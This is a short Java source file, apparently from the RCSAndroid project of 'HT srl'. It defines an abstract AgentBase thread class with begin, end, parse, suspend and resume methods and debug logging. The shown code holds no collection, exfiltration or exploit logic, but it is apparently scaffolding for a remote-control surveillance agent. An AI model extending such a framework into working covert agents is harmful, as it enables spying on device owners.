/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 30-mar-2011
 **********************************************/

package com.ht.RCSAndroidGUI.agent;

import android.util.Log;

import com.ht.RCSAndroidGUI.ThreadBase;

// TODO: Auto-generated Javadoc
/**
 * The Class AgentBase.
 */
public abstract class AgentBase extends ThreadBase implements Runnable {
	private static final String TAG = "AgentBase";

	// Gli eredi devono implementare i seguenti metodi astratti
	/**
	 * Begin.
	 */
	public abstract void begin();

	/**
	 * End.
	 */
	public abstract void end();

	/**
	 * Parses the.
	 * 
	 * @param conf
	 *            the conf
	 */
	public abstract boolean parse(AgentConf conf);

	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Thread#run()
	 */
	public synchronized void run() {
		// Check.asserts(agentEnabled, string)
		status = AgentConf.AGENT_RUNNING;

		try {
			begin();
			loop();
		} catch (Exception ex) {
			Log.d("QZ", TAG + " Error: " + ex);
		}

		try {
			end();
		} catch (Exception ex) {
			Log.d("QZ", TAG + " Error: " + ex);
		}

		status = AgentConf.AGENT_STOPPED;
		Log.d("QZ", TAG + " AgentBase stopped");
	}

	boolean suspended;

	synchronized void suspend() {
		suspended = true;
		stopThread();
	}

	synchronized void resume() {
		suspended = false;
	}

	public synchronized boolean isSuspended() {
		return suspended;
	}
}